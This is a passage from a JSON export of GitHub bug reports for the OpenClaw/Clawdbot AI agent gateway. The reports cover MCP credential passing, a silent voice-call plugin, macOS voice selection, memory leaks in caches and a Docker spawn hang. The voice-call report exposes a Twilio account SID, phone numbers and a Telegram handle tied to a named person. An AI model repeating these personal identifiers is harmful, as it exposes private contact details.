      "body": "Summary\nMicrosoft Graph credentials configured in mcporter.json and environment variables are not being passed to the @softeria/ms-365-mcp-server MCP server. Clawdbot repeatedly reports it cannot find MS365_MCP_CLIENT_ID and MS365_MCP_TENANT_ID despite these being configured in multiple locations.\nSteps to reproduce\n\nInstall @softeria/ms-365-mcp-server: npm install -g @softeria/ms-365-mcp-server\nConfigure Azure AD app with required Microsoft Graph API permissions (Mail.ReadWrite, Calendar.ReadWrite, etc.) and redirect URI http://localhost:3365/callback\nCreate ~/.clawdbot/mcporter.json with Microsoft Graph credentials:\n\njson{\n  \"mcpServers\": {\n    \"ms365\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@softeria/ms-365-mcp-server\"],\n      \"env\": {\n        \"MS365_MCP_CLIENT_ID\": \"${MS365_MCP_CLIENT_ID}\",\n        \"MS365_MCP_CLIENT_SECRET\": \"${MS365_MCP_CLIENT_SECRET}\",\n        \"MS365_MCP_TENANT_ID\": \"${MS365_MCP_TENANT_ID}\"\n      }\n    }\n  }\n}\n```\n4. Set environment variables in `~/.clawdbot/.env`:\n```\nMS365_MCP_CLIENT_ID=<client-id>\nMS365_MCP_CLIENT_SECRET=<client-secret>\nMS365_MCP_TENANT_ID=<tenant-id>\n```\n5. Also added variables to `~/.bashrc` and systemd service file `~/.config/systemd/user/clawdbot-gateway.service`\n6. Restart gateway: `clawdbot gateway restart`\n7. Test: `clawdbot agent --message \"Check my emails\" --to <phone> --channel telegram --deliver`\n\n## Expected behavior\nClawdbot should pass the configured environment variables to the ms365 MCP server, allowing it to authenticate with Microsoft Graph API and access email/calendar data.\n\n## Actual behavior\nClawdbot responds: \"I cannot access your email without the Tenant ID and Client ID\" despite these credentials being configured in mcporter.json, .env file, bashrc, and systemd service environment variables.\n\nThe MCP server appears to not receive the environment variables from any of these configuration sources.\n\n## Environment\n- Clawdbot version: 2026.1.24-3\n- OS: Ubuntu 24.04 (Hostinger VPS)\n- Install method: npm global install\n\n## Logs or screenshots\nGateway status shows running correctly:\n```\nRuntime: running (pid 15306, state active, sub running)\nRPC probe: ok\nmcporter.json validation passes:\nbashcat ~/.clawdbot/mcporter.json | python3 -m json.tool\n# Returns valid JSON with credentials configured\nEnvironment variables confirmed set:\nbashecho $MS365_MCP_CLIENT_ID\n# Returns correct client ID\nAdditional context\nThis appears similar to issues reported in Claude Code repository:\n\nIssue #1254: Environment variables from env section not passed to MCP servers\nIssue #10955: MCP Server Environment Variables Not Loading\n\nThese issues suggest environment variables in the env block of MCP configuration may not be passed correctly to spawned MCP server processes.\nAttempted workarounds:\n\nHardcoding credentials directly in args array (ms365 server doesn't accept --client-id flags)\nMultiple configuration file locations\nSystemd service environment variables\nGlobal .env file\n\nNone resolved the issue. The ms365 MCP server requires environment variables but doesn't appear to receive them from Clawdbot's configuration.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5127",
      "createdAt": "2026-01-31T03:10:14Z",
      "updatedAt": "2026-02-11T04:12:24Z",
      "author": "ryanmccabe69",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882020000,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5127#issuecomment-3882020000",
          "createdAt": "2026-02-11T04:12:24Z",
          "updatedAt": "2026-02-11T04:12:24Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5131,
      "title": "Voice call plugin accepts calls but never generates/serves TTS audio",
      "body": "# Voice Call Plugin Bug Report\n\n**Date:** 2026-01-30  \n**Clawdbot Version:** 2026.1.24-3  \n**Plugin:** voice-call  \n**Provider:** Twilio + ElevenLabs TTS\n\n## Issue Summary\n\nThe voice-call plugin accepts incoming and outgoing calls successfully, validates phone numbers against the allowlist, and creates call records — but **never generates or serves TTS audio**. Calls ring but no audio is played, resulting in silent calls that eventually timeout.\n\n## Reproduction Steps\n\n### Inbound Calls\n1. Call the configured Twilio number: +1 (929) 547-4175\n2. Call is accepted by plugin (logs confirm)\n3. **Expected:** Hear AI voice greeting\n4. **Actual:** Complete silence, call eventually times out\n\n### Outbound Calls\n1. Use `voice_call` tool: `initiate_call(to=\"+19292615401\", message=\"Test\")`\n2. Call connects\n3. **Expected:** Hear TTS audio with the message\n4. **Actual:** Complete silence\n\n## Evidence from Logs\n\n### Call Acceptance (Working ✅)\n```\n[voice-call] Inbound call accepted: +19292615401 is in allowlist\n[voice-call] Created inbound call record: 04622a26-38f3-4569-9fcc-b02f183acf80 from +19292615401\n```\n\n### TTS Generation (Missing ❌)\n**No logs showing:**\n- ElevenLabs API calls\n- TTS audio generation\n- TwiML response generation\n- Audio file serving\n\nThe plugin stops after creating the call record and never proceeds to generate/serve audio.\n\n## Configuration\n\n```json\n{\n  \"provider\": \"twilio\",\n  \"twilio\": {\n    \"accountSid\": \"AC9efbd71a6748cc01479ed768b2ed3f2f\",\n    \"authToken\": \"[REDACTED]\"\n  },\n  \"inboundPolicy\": \"allowlist\",\n  \"allowFrom\": [\"+61407708565\", \"+19292615401\"],\n  \"fromNumber\": \"+19295474175\",\n  \"serve\": {\n    \"port\": 18790,\n    \"bind\": \"127.0.0.1\",\n    \"path\": \"/voice\"\n  },\n  \"tunnel\": {\n    \"provider\": \"ngrok\",\n    \"allowNgrokFreeTier\": true,\n    \"ngrokAuthToken\": \"[REDACTED]\"\n  },\n  \"tts\": {\n    \"provider\": \"elevenlabs\",\n    \"elevenlabs\": {\n      \"apiKey\": \"[REDACTED]\",\n      \"voiceId\": \"pNInz6obpgDQGcFmaJgB\",\n      \"modelId\": \"eleven_multilingual_v2\"\n    }\n  },\n  \"maxDurationSeconds\": 600,\n  \"silenceTimeoutMs\": 5000,\n  \"transcriptTimeoutMs\": 3000\n}\n```\n\n## Verification Tests\n\n### ElevenLabs TTS (Works Standalone ✅)\n```bash\ncurl -X POST \"https://api.elevenlabs.io/v1/text-to-speech/pNInz6obpgDQGcFmaJgB\" \\\n  -H \"Accept: audio/mpeg\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"xi-api-key: [KEY]\" \\\n  -d '{\"text\":\"Test\",\"model_id\":\"eleven_multilingual_v2\"}' \\\n  --output /tmp/test-tts.mp3\n\n# Result: Successfully generated 17KB MP3 file\n```\n\n### Webhook URL (Configured Correctly ✅)\n- Ngrok tunnel: `https://nonseclusively-unairable-page.ngrok-free.dev/voice`\n- Twilio voice URL: `https://nonseclusively-unairable-page.ngrok-free.dev/voice`\n- URLs match and ngrok is active\n\n### Phone Number Validation (Working ✅)\n- Allowlist properly configured\n- Logs show successful validation\n- Call records created correctly\n\n## Twilio Call Status\n\n```json\n{\n  \"from\": \"+19292615401\",\n  \"to\": \"+19295474175\",\n  \"status\": \"busy\"\n}\n```\n\nStatus shows \"busy\" because the webhook doesn't return proper TwiML.\n\n## Expected Behavior\n\nWhen a call is accepted (inbound or outbound), the plugin should:\n1. Generate TTS audio via ElevenLabs for the greeting/message\n2. Create a TwiML response with `<Play>` verb pointing to the audio\n3. Return the TwiML to Twilio\n4. Serve the audio file when Twilio requests it\n5. Listen for user speech and continue the conversation\n\n## Actual Behavior\n\nThe plugin:\n1. ✅ Receives webhook from Twilio\n2. ✅ Validates caller against allowlist\n3. ✅ Creates call record\n4. ❌ **Never generates TTS audio**\n5. ❌ **Never returns TwiML response**\n6. ❌ **Call hangs in silence**\n\n## System Environment\n\n- **OS:** macOS (Darwin 24.6.0 arm64)\n- **Node:** v25.4.0\n- **Clawdbot:** 2026.1.24-3 (latest)\n- **Runtime:** Local gateway with ngrok tunnel\n- **Elevated:** Yes\n\n## Additional Notes\n\n- This appears to be a regression or incomplete implementation in the audio generation/serving flow\n- The infrastructure (Twilio, ElevenLabs, webhooks, ngrok) all work correctly in isolation\n- The issue is specifically in the plugin's integration between call handling and TTS generation\n- Both inbound and outbound calls are affected identically\n\n## Requested Fix\n\nThe voice-call plugin needs to properly:\n1. Generate TTS audio when a call is accepted/initiated\n2. Create and return TwiML responses to Twilio\n3. Serve audio files via the webhook endpoint\n4. Log TTS generation and audio serving steps for debugging\n\n## Contact\n\nReport filed by: Brad L (via Naomi AI assistant)  \nTelegram: @bradlindbot  \nPhone: +1 (929) 261-5401\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5131",
      "createdAt": "2026-01-31T03:21:23Z",
      "updatedAt": "2026-02-11T04:12:22Z",
      "author": "bradlind1",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3837180085,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5131#issuecomment-3837180085",
          "createdAt": "2026-02-02T19:29:15Z",
          "updatedAt": "2026-02-02T19:29:15Z",
          "author": "carlj-dev",
          "body": "## Additional Report - Same Issue\n\n**Date:** 2026-02-02  \n**OpenClaw Version:** 2026.2.1  \n**Provider:** Twilio  \n**Tunnel:** Cloudflare Tunnel (cloudflared)\n\n### Confirming Same Behavior\n\nExperiencing the identical issue:\n\n1. ✅ Webhook receives call from Twilio\n2. ✅ Call accepted, allowlist validated\n3. ✅ Call record created\n4. ❌ Webhook returns only `<Pause length=\"30\"/>` instead of `<Say>` or streaming TwiML\n5. ❌ No TTS audio generated\n6. ❌ Call times out silently\n\n### Webhook Response Test\n```bash\ncurl -X POST http://localhost:3334/voice/webhook \\\n  -d \"CallSid=test&From=+1234&Direction=inbound\"\n# Returns: <Response><Pause length=\"30\"/></Response>\n```\n\n### Expected Behavior\n\nPer docs: \"otherwise calls fall back to provider native voices\" — should return `<Say>` with inboundGreeting when streaming isn't available.\n\n### Environment\n- macOS (Darwin 25.2.0 arm64)\n- Node v25.5.0\n- Cloudflare Tunnel (cloudflared)\n\nAffects both inbound and outbound calls."
        },
        {
          "id": 3882019933,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5131#issuecomment-3882019933",
          "createdAt": "2026-02-11T04:12:22Z",
          "updatedAt": "2026-02-11T04:12:22Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5132,
      "title": "macOS app Talk mode ignores system voice preference (uses language default instead)",
      "body": "## Summary\n\nThe macOS app's Talk mode TTS does not respect the user's preferred system voice. It uses `AVSpeechSynthesisVoice(language:)` which returns any voice for the language, ignoring the voice configured in **System Settings → Accessibility → Spoken Content → System Voice**.\n\n## Current Behavior\n\nIn `TalkSystemSpeechSynthesizer.swift`:\n```swift\nif let language, let voice = AVSpeechSynthesisVoice(language: language) {\n    utterance.voice = voice\n}\n```\n\nThis selects a voice based on language code only, not the user's preference. Users who set a Siri voice or other preferred voice in System Settings find the app still uses a different default voice.\n\n## Expected Behavior\n\nThe app should either:\n1. Use the system's default voice (respecting user preference), or\n2. Provide an in-app setting to select from available `AVSpeechSynthesisVoice.speechVoices()`\n\n## Steps to Reproduce\n\n1. Open **System Settings → Accessibility → Spoken Content**\n2. Set **System Voice** to a Siri voice (e.g., \"Siri Voice 1\")\n3. Open OpenClaw.app and enable Talk mode\n4. Trigger a spoken response\n5. Observe: The app uses a different voice than the one configured\n\n## Suggested Fix\n\nOption A - Respect system preference:\n```swift\n// Use nil voice to let system pick the preferred default\nutterance.voice = nil\n```\n\nOption B - Add voice selection setting:\n- Add `openclaw.talkVoiceIdentifier` preference\n- Expose a voice picker in **Settings → Voice**\n- Use `AVSpeechSynthesisVoice(identifier:)` with the stored preference\n\n## Environment\n\n- OpenClaw.app 2026.1.29\n- macOS Sequoia\n- Source: `apps/shared/OpenClawKit/Sources/OpenClawKit/TalkSystemSpeechSynthesizer.swift`",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5132",
      "createdAt": "2026-01-31T03:23:41Z",
      "updatedAt": "2026-02-11T04:12:21Z",
      "author": "jsperson",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882019874,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5132#issuecomment-3882019874",
          "createdAt": "2026-02-11T04:12:20Z",
          "updatedAt": "2026-02-11T04:12:20Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5133,
      "title": "[Bug]: seqByRun Map in agent-events grows unbounded without cleanup",
      "body": "\n**Severity:** P1/High (Score: 100/150)\n**CWE:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html) - Uncontrolled Resource Consumption\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/infra/agent-events.ts:21`\n\n| Factor | Assessment | Score |\n|--------|------------|-------|\n| **Reachability** | Any agent run triggers growth | 40/40 |\n| **Impact** | Memory exhaustion over time | 20/50 |\n| **Exploitability** | Requires sustained usage | 10/30 |\n| **Verification** | Code confirmed, no cleanup | 30/30 |\n| **Total** | — | **100/150** |\n\n## Summary\nThe `seqByRun` Map in `src/infra/agent-events.ts` accumulates sequence counters for every agent run without any cleanup mechanism. Unlike other state Maps in the codebase (which have cleanup functions), `seqByRun` entries persist forever.\n\n## Steps to reproduce\n1. Run the gateway for an extended period\n2. Process many agent runs\n3. Monitor memory usage of `seqByRun` Map\n4. Observe continuous growth without bound - entries are never removed\n\n## Expected behavior\nThe `seqByRun` Map should have cleanup mechanisms:\n- Explicit cleanup when agent run completes\n- TTL-based expiration for stale entries\n- Maximum size limit with eviction\n\n## Actual behavior\nThe Map grows without limit:\n\n### Affected code location:\n\n**Agent Events** (`src/infra/agent-events.ts:21`):\n```typescript\nconst seqByRun = new Map<string, number>();\n```\n\n**Operations performed:**\n- Line 56: `.get(runId)` - reads sequence\n- Line 57: `.set(runId, seq)` - writes sequence\n\n**Missing: No `.delete()` or `.clear()` calls anywhere for this Map.**\n\n### Contrast with properly cleaned Maps in same file:\n\n`runContextById` (line 23) has proper cleanup:\n- `clearAgentRunContext(runId)` at line 47-49 calls `runContextById.delete(runId)`\n- Called from `src/gateway/server-chat.ts:258,289` on \"run_end\" lifecycle events\n\nBut `seqByRun` is NOT included in `clearAgentRunContext()`.\n\n## Environment\n- Clawdbot version: latest (main branch)\n- OS: Any\n- Install method: Any (especially affects long-running deployments)\n\n## Logs or screenshots\nN/A - manifests as memory growth over time\n\n## Impact\n- **Memory exhaustion**: Map grows proportional to total agent runs over gateway lifetime\n- **Performance degradation**: Large Maps slow down operations\n- **Orphaned state**: Sequence counters for completed runs persist forever\n- **Subtle bugs**: If run IDs are ever reused, stale sequence numbers could cause issues\n\n## Recommended fix\nInclude `seqByRun` in the existing cleanup function:\n\n```typescript\nexport function clearAgentRunContext(runId: string) {\n  seqByRun.delete(runId);        // Add this line\n  runContextById.delete(runId);\n}\n```\n\nThis ensures sequence counters are cleaned up at the same time as run contexts, using the existing cleanup call sites.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5133",
      "createdAt": "2026-01-31T03:25:41Z",
      "updatedAt": "2026-02-11T04:12:19Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3830630149,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5133#issuecomment-3830630149",
          "createdAt": "2026-02-01T08:43:41Z",
          "updatedAt": "2026-02-01T08:43:41Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 6.5 / 10.0 |\n| **Severity** | Medium |\n| **Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3882019819,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5133#issuecomment-3882019819",
          "createdAt": "2026-02-11T04:12:18Z",
          "updatedAt": "2026-02-11T04:12:18Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5135,
      "title": "[Bug]: execDocker() missing spawn error handler causes infinite hang",
      "body": "\n**Severity:** P1/High (Score: 105/150)\n**CWE:** [CWE-755](https://cwe.mitre.org/data/definitions/755.html) - Improper Handling of Exceptional Conditions\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/agents/sandbox/docker.ts:13-35`\n\n| Factor | Assessment | Score |\n|--------|------------|-------|\n| **Reachability** | Sandbox operations | 30/40 |\n| **Impact** | Promise hangs forever, gateway blocks | 35/50 |\n| **Exploitability** | Requires docker unavailable | 10/30 |\n| **Verification** | Code confirmed, no error handler | 30/30 |\n| **Total** | — | **105/150** |\n\n## Summary\nThe `execDocker()` function spawns a docker process but only handles the \"close\" event. If `spawn()` fails (docker not found, permission denied, system out of PIDs), the \"error\" event fires but is unhandled, causing the promise to hang forever.\n\n## Steps to reproduce\n1. Configure sandbox with docker-based execution\n2. Remove docker from PATH or revoke permissions\n3. Trigger an agent action that requires sandbox\n4. Observe `execDocker()` promise hangs indefinitely\n5. Gateway becomes unresponsive as worker threads block\n\n## Expected behavior\nIf docker spawn fails, the promise should reject immediately with a clear error message.\n\n## Actual behavior\nPromise hangs forever on spawn failure:\n\n### Affected code location:\n\n**Docker Exec** (`src/agents/sandbox/docker.ts:13-35`):\n```typescript\nexport function execDocker(args: string[], opts?: { allowFailure?: boolean }) {\n  return new Promise<{ stdout: string; stderr: string; code: number }>((resolve, reject) => {\n    const child = spawn(\"docker\", args, {\n      stdio: [\"ignore\", \"pipe\", \"pipe\"],\n    });\n    let stdout = \"\";\n    let stderr = \"\";\n    child.stdout?.on(\"data\", (chunk) => {\n      stdout += chunk.toString();\n    });\n    child.stderr?.on(\"data\", (chunk) => {\n      stderr += chunk.toString();\n    });\n    child.on(\"close\", (code) => {  // Only \"close\" event handled\n      const exitCode = code ?? 0;\n      if (exitCode !== 0 && !opts?.allowFailure) {\n        reject(new Error(stderr.trim() || `docker ${args.join(\" \")} failed`));\n        return;\n      }\n      resolve({ stdout, stderr, code: exitCode });\n    });\n    // MISSING: child.on(\"error\", ...) handler\n  });\n}\n```\n\n## Environment\n- Clawdbot version: latest (main branch)\n- OS: Any\n- Install method: Any (especially affects containerized deployments)\n\n## Logs or screenshots\nN/A - manifests as hung processes\n\n## Impact\n- **Complete hang**: All sandbox operations block indefinitely\n- **No recovery**: No timeout mechanism to detect the hang\n- **Cascading failure**: Gateway becomes unresponsive\n- **Silent failure**: No error logged, no indication of what's wrong\n- **Difficult debugging**: Process appears running but does nothing\n\n## Recommended fix\nAdd error event handler:\n```typescript\nexport function execDocker(args: string[], opts?: { allowFailure?: boolean }) {\n  return new Promise<{ stdout: string; stderr: string; code: number }>((resolve, reject) => {\n    const child = spawn(\"docker\", args, {\n      stdio: [\"ignore\", \"pipe\", \"pipe\"],\n    });\n    let stdout = \"\";\n    let stderr = \"\";\n\n    child.on(\"error\", (err) => {\n      reject(new Error(`Failed to spawn docker: ${err.message}`));\n    });\n\n    child.stdout?.on(\"data\", (chunk) => {\n      stdout += chunk.toString();\n    });\n    child.stderr?.on(\"data\", (chunk) => {\n      stderr += chunk.toString();\n    });\n    child.on(\"close\", (code) => {\n      const exitCode = code ?? 0;\n      if (exitCode !== 0 && !opts?.allowFailure) {\n        reject(new Error(stderr.trim() || `docker ${args.join(\" \")} failed`));\n        return;\n      }\n      resolve({ stdout, stderr, code: exitCode });\n    });\n  });\n}\n```\n\nAdditionally, consider adding a timeout:\n```typescript\nconst timeout = setTimeout(() => {\n  child.kill();\n  reject(new Error(`docker ${args.join(\" \")} timed out`));\n}, 60000);\n```",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5135",
      "createdAt": "2026-01-31T03:29:59Z",
      "updatedAt": "2026-02-11T04:12:17Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3830630285,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5135#issuecomment-3830630285",
          "createdAt": "2026-02-01T08:43:48Z",
          "updatedAt": "2026-02-01T08:43:48Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 5.1 / 10.0 |\n| **Severity** | Medium |\n| **Vector** | CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3882019759,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5135#issuecomment-3882019759",
          "createdAt": "2026-02-11T04:12:16Z",
          "updatedAt": "2026-02-11T04:12:16Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5260,
      "title": "[Bug]: Discord thread starter cache grows unbounded - only test helper clears it",
      "body": "\n## Summary\n\n**Severity:** P1/High (Score: 85/150)\n**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html) - Allocation of Resources Without Limits or Throttling\n**OWASP:** [A05:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) - Security Misconfiguration\n**File:** `src/discord/monitor/threading.ts:32-36`\n\nThe Discord thread starter cache uses a module-level Map with no TTL or size limit. The only `clear()` call is a test helper never invoked in production.\n\n**Why this is P1:** The presence of `__resetDiscordThreadStarterCacheForTest` shows developers recognized the need for cleanup but only implemented it for tests.\n\n## Triage Assessment\n\n| Factor | Value | Score |\n|--------|-------|-------|\n| **Reachability** | Internal cache, grows with normal Discord usage | 15/40 |\n| **Impact** | Memory exhaustion leading to OOM crash | 20/50 |\n| **Exploitability** | Automatic over time, no attacker action needed | 20/30 |\n| **Verification** | file:line ✓, code ✓, attack steps ✓ | 30/30 |\n| **Total** | — | **85/150** |\n\n## Steps to reproduce\n1. Deploy OpenClaw monitoring active Discord servers with many threads\n2. Monitor memory usage over days/weeks\n3. Observe steady memory growth proportional to unique threads\n4. Eventually process is OOM-killed\n\n## Expected behavior\nCache should have TTL-based expiration and/or max size limits.\n\n## Actual behavior\nEvery unique Discord thread creates a permanent cache entry. The test reset helper confirms this is recognized as a problem but only addressed for tests.\n\n### Affected code location:\n**File** (`src/discord/monitor/threading.ts:32-36`):\n```typescript\nconst DISCORD_THREAD_STARTER_CACHE = new Map<string, DiscordThreadStarter>();\n\nexport function __resetDiscordThreadStarterCacheForTest() {\n  DISCORD_THREAD_STARTER_CACHE.clear();  // Only for tests - never called in production!\n}\n```\n\n**File** (`src/discord/monitor/threading.ts:87-134`):\n```typescript\nexport async function resolveDiscordThreadStarter(params: {...}): Promise<DiscordThreadStarter | null> {\n  const cacheKey = params.channel.id;\n  const cached = DISCORD_THREAD_STARTER_CACHE.get(cacheKey);\n  if (cached) return cached;\n\n  // ... fetch from Discord API ...\n\n  DISCORD_THREAD_STARTER_CACHE.set(cacheKey, payload);  // Never evicted\n  return payload;\n}\n```\n\n## Environment\n- Version: latest (main branch)\n- OS: Any\n- Install method: Any\n\n## Logs or screenshots\nN/A - memory leak manifests over time\n\n## Impact\n- **Memory Exhaustion**: Process OOM after extended operation\n- **High-Traffic Risk**: Discord communities with many channels/threads hit this faster\n- **Unpredictable Latency**: GC pressure causes latency spikes before crash\n- **Test-Only Mitigation**: Developers recognized issue but only fixed for tests\n\n## Recommended fix\n1. **Add TTL and size limits**:\n```typescript\nimport { createDedupeCache } from \"../infra/dedupe\";\n\nconst DISCORD_THREAD_STARTER_CACHE = createDedupeCache<DiscordThreadStarter>({\n  maxSize: 10000,\n  ttlMs: 3600000,  // 1 hour\n});\n```\n\n2. **Or implement periodic cleanup in production**:\n```typescript\nconst CACHE_CLEANUP_INTERVAL_MS = 3600000;  // 1 hour\nsetInterval(() => {\n  if (DISCORD_THREAD_STARTER_CACHE.size > 5000) {\n    DISCORD_THREAD_STARTER_CACHE.clear();  // Or LRU eviction\n  }\n}, CACHE_CLEANUP_INTERVAL_MS);\n```",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5260",
      "createdAt": "2026-01-31T07:55:25Z",
      "updatedAt": "2026-02-11T04:12:07Z",
      "author": "coygeek",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3830630827,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5260#issuecomment-3830630827",
          "createdAt": "2026-02-01T08:44:18Z",
          "updatedAt": "2026-02-01T08:44:18Z",
          "author": "coygeek",
          "body": "## CVSS Assessment\n\n| Metric | Value |\n|--------|-------|\n| **Score** | 6.2 / 10.0 |\n| **Severity** | Medium |\n| **Vector** | CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |\n\n> [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)\n"
        },
        {
          "id": 3882019369,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5260#issuecomment-3882019369",
          "createdAt": "2026-02-11T04:12:06Z",
          "updatedAt": "2026-02-11T04:12:06Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5290,
      "title": "[Bug]: Bedrock Auto Discovery fails to retrieve or support Inference Profile IDs of Models.",
      "body": "## Summary\nBedrock Auto Discovery fails to retrieve or support Inference Profile IDs.\nSo Bedrock models can't be invoked normally.\n\nCurrent Behavior\nThe current Bedrock auto-discovery logic only searches for standard Model IDs (e.g., anthropic.claude-3-sonnet-20240229-v1:0). However, for many newer models or enhanced throughput capabilities, Bedrock now requires the use of Inference Profile IDs (e.g., us.anthropic.claude-3-5-sonnet-20240620-v1:0).\n\nWhen the auto-discovery runs, it either:\n\nFails to find these new models entirely.\n\nReturns a standard Model ID that results in throttled performance or access errors because the cross-region inference profile is expected.\n\nExpected Behavior\nThe auto-discovery mechanism should be updated to:\n\nIdentify and support Inference Profiles (both application-specific and system-defined).\n\nPrioritize or allow the selection of Inference Profile IDs over raw Model IDs where applicable.\n\nCorrectly map regional endpoints to their respective Inference Profile ARNs/IDs.\n\n## Steps to reproduce\n1.Enable Bedrock auto-discovery in configure file in  special  region (e.g., us-east-1 or us-west-2).\n\n2. use /model <provider/model id >\n\n3.verify clawdbot whethter works well.\n\n## Expected behavior\nWhat did you expect to happen?\nlist model's profile id.\n\n## Actual behavior\nWhat actually happened?\nonly list model id, not Inference Profile Id.\n\n## Environment\n- Clawdbot version:\n- OS: ubuntu 24.04\n- Install method (pnpm/npx/docker/etc):\npnpm\n\n## Logs or screenshots\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5290",
      "createdAt": "2026-01-31T08:42:55Z",
      "updatedAt": "2026-02-11T04:12:03Z",
      "author": "heqiqi",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3840172642,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5290#issuecomment-3840172642",
          "createdAt": "2026-02-03T09:34:26Z",
          "updatedAt": "2026-02-03T09:34:26Z",
          "author": "sentience",
          "body": "Thanks! I'm currently blocked by this.\n\nIs there some way to bypass the auto-discovery in the meantime?"
        },
        {
          "id": 3843399815,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5290#issuecomment-3843399815",
          "createdAt": "2026-02-03T20:06:36Z",
          "updatedAt": "2026-02-03T20:06:36Z",
          "author": "vaughngit",
